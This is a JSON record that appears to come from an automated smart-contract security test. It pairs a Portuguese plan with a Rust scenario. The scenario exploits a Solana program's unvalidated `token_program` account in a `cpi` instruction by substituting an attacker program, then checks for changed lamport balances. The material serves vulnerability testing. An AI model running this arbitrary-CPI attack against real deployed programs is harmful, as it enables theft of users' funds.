{
  "plan": "O programa-alvo expõe a instrução `cpi` que recebe `source`, `destination`, `authority` e `token_program` como AccountInfo genéricas e invoca `token_program` via CPI sem validar sua chave. O baseline usa um programa legítimo (o próprio program_id do alvo, que aceita qualquer instrução) como `token_program` e deve ter sucesso. O ataque substitui `token_program` pelo `attacker_program` (endereço diferente do baseline) mantendo as demais contas, e o efeito medido é que o programa invocado foi o do atacante, evidenciado pela mudança de estado que o atacante produz (ex.: lamports transferidos de `source` para `destination`).",
  "scenario": "let source = Pubkey::new_unique();
let destination = Pubkey::new_unique();
let authority = Pubkey::new_unique();

let source_acc = wallet(1_000_000_000);
let destination_acc = wallet(1_000_000_000);
let authority_acc = wallet(1_000_000_000);

let legit_program = env.program_id;
let legit_program_acc = program_account(&legit_program);

let metas_legit = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(legit_program, false),
];
let ix_legit = env.anchor_ix("cpi", &(42u64,), metas_legit);
let contas_legit = vec![
    (source, source_acc.clone()),
    (destination, destination_acc.clone()),
    (authority, authority_acc.clone()),
    (legit_program, legit_program_acc),
];
let r_base = env.baseline("uso legitimo da instrucao cpi", &ix_legit, &contas_legit);

let attacker = env.attacker_program.expect("attacker program disponivel");
let attacker_acc = program_account(&attacker);

let metas_attack = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(attacker, false),
];
let ix_attack = env.anchor_ix("cpi", &(42u64,), metas_attack);
let contas_attack = vec![
    (source, source_acc.clone()),
    (destination, destination_acc.clone()),
    (authority, authority_acc.clone()),
    (attacker, attacker_acc),
];
let r = env.attack("token_program substituido por programa do atacante", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let dest_after = after(&r, &destination);
    let src_after = after(&r, &source);
    env.effect(
        "programa do atacante foi invocado e alterou o estado das contas passadas",
        dest_after.lamports() != destination_acc.lamports()
            || src_after.lamports() != source_acc.lamports(),
    );
}"
}

